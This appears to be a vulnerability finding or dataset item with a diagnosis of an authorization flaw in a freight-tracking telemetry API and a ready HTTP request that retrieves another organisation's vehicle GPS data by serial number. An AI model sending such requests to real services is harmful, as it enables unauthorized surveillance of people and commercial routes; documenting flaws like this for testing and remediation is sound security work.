diagnosis: The telemetry endpoint fetches real-time GPS tracking points by hardware serial number without validating that the tracking device is registered to the authenticated fleet manager's logistics organization. Competitors can monitor delivery vehicle locations and commercial freight routes.
exploit_request:
GET /api/fleet/telemetry/TRK-9921-GPS HTTP/1.1
Host: tracking.freightpulse.com
Authorization: Bearer 71|f0e9d8c7b6a54321fedcba0987654321
Accept: application/json
